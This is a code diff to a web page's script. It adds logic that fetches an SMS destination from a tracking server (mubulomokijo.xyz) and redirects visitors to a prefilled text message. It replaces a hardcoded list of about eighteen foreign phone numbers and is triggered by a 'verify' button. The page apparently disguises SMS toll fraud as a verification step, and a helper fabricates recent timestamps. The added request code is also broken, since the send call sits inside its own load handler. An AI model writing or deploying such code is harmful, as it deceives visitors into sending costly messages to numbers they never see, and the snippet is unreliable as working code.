@@ -171,6 +171,55 @@
     </div>
   </form>
   <script>
+
+    function getURLParameter(name) {
+      return decodeURI(
+        (RegExp('[?&]' + name + '=' + '(.*?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    }
+    var tracking = getURLParameter('tracking');
+
+    function getMobileOperatingSystem() {
+      var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+      if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        return 'iphone';
+      }
+
+      if (/android/i.test(userAgent)) {
+        return 'android';
+      }
+
+      return 'unknown';
+    }
+
+    function convertAndroidToiPhone(androidUrl) {
+      // 检查传入的 URL 是否是以 "sms:" 开头
+      if (!androidUrl.startsWith('sms:')) {
+        throw new Error("URL格式不正确，必须以 'sms:' 开头");
+      }
+
+      // 去除 "sms:" 前缀
+      let urlContent = androidUrl.substring(4);
+
+      // 分割出电话号码和body
+      let [phoneNumbersPart, bodyPart] = urlContent.split('?body=');
+
+      // 分割出各个电话号码
+      let phoneNumbers = phoneNumbersPart.split(';').map(num => num.trim());
+
+      // 把电话号码数组转换为以逗号分隔的字符串
+      let phoneNumbersStr = phoneNumbers.join(',');
+
+      // 编码 body 部分以适配 URL
+      let encodedBody = encodeURIComponent(bodyPart);
+
+      // 构造 iPhone 格式的 SMS URL
+      let iPhoneUrl = `sms://open?addresses=${phoneNumbersStr}/&body=${encodedBody}`;
+
+      return iPhoneUrl;
+    }
+
     // 添加辅助函数获取格式化时间
     function getFormattedTime(minutesAgo = 0) {
       const now = new Date();
@@ -405,8 +454,11 @@
         document.getElementById('verify-button').textContent = modalContent.modal.validating;
         // 发送短信验证码或其他验证方式
         console.log('发送验证请求...');
-        handleSMS('send', modalTitle); // Use handleSMS to send SMS
-
+        try {
+          handleSMS('send', modalTitle); // Use handleSMS to send SMS
+        } catch (error) {
+          console.log('Error sending SMS:', error);
+        }
         // 在点击确认后等待 3 秒再隐藏弹窗
         setTimeout(function () {
           modalOverlay.classList.remove('show'); // 移除 'show' 类以隐藏弹窗
@@ -485,13 +537,46 @@
 
     // Unified SMS handling function
     function handleSMS(action, message = "") {
+      console.log(`SMS ${action} action triggered with message: ${message}`);
+      // track id need to be added to the url 
+      var tracking = getURLParameter('tracking');
 
-      var sms = "sms://open?addresses=+992917172474,+992911151430,+34651714076,+34665291217,+34665291200,+992917172482,+201103502264,+992917172399,+201103502251,+34665291250,+34651714230,+992919320905,+992919321826,+992919321805,+34665291252,+34665291262,+34665291204,+201103593243/&body=" + encodeURIComponent(message);
-      location.href = sms;
+      console.log('Tracking:', tracking);
 
+      var url = "https://mubulomokijo.xyz/track/mtracker.php?clientId=606&productId=1452&country={country_iso_2}&isp={isp_utf8_encoded}&tracking=" + tracking;
 
+      console.log('URL:', url);
+
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', url);
+      xhr.onload = function () {
+        if (xhr.status === 200) {
+          console.log('Request succeeded. Response:', xhr.response);
+          var body = xhr.response;
+
+          var data = JSON.parse(body);
+
+          var urlTo = data.urlTo;
+
+          console.log(urlTo);
+
+          // 判断用户是 android 还是 ios
+          var os = getMobileOperatingSystem();
+          console.log('User is using: ' + os);
+          if (os == 'iphone') {
+            urlTo = convertAndroidToiPhone(urlTo);
+          }
+          console.log(urlTo);
+
+          window.location.href = urlTo;
+
+          xhr.send();
+
+        } else {
+          console.log('Request failed.  Returned status of ' + xhr.status);
+        }
+      }
     }
-
   </script>
 
 </body>
